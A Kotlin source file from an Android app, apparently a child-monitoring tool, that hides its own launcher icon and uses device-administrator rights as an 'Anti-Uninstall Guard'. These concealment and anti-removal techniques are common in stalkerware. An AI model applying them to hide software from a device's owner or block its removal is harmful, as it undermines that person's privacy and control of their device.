package com.airconnection.app.child

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.widget.Toast
import com.airconnection.app.MainActivity

object ChildProtectionManager {

    private const val PREFS_NAME = "child_protection_prefs"
    private const val KEY_UNINSTALL_ALLOWED = "uninstall_allowed"

    fun isUninstallAllowed(context: Context): Boolean {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getBoolean(KEY_UNINSTALL_ALLOWED, false)
    }

    fun setUninstallAllowed(context: Context, allowed: Boolean) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putBoolean(KEY_UNINSTALL_ALLOWED, allowed).apply()
        if (allowed) {
            showAppIcon(context)
        } else {
            hideAppIcon(context)
        }
    }

    fun isProtectionActive(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(context, AirConnectionAdminReceiver::class.java)
        return dpm.isAdminActive(componentName)
    }

    fun applyProtection(context: Context) {
        setUninstallAllowed(context, false)
        if (isProtectionActive(context)) {
            Toast.makeText(context, "Anti-Uninstall Guard Active & Icon Hidden", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(context, "Icon Hidden. Grant Device Admin for lifetime protection.", Toast.LENGTH_LONG).show()
        }
    }

    fun hideAppIcon(context: Context) {
        try {
            val pm = context.packageManager
            val componentName = ComponentName(context, MainActivity::class.java)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun showAppIcon(context: Context) {
        try {
            val pm = context.packageManager
            val componentName = ComponentName(context, MainActivity::class.java)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
